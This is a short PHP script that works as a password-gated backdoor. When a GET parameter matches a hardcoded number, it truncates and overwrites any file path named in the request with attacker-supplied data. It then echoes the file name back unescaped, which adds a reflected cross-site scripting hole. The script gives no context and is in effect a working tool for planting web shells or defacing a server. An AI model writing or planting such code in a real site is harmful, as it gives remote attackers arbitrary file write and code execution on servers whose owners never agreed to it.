<?php
$password = $_GET["pass"];
if ($password == 12345678910){
$file = $_GET["file"];
$fileopen = fopen($file, 'w') or die("can't open file");
$data = $_GET["data"];
ftruncate($fileopen,0);
fwrite($fileopen, $data);
fclose($fileopen);
}
echo $_GET["file"];

?>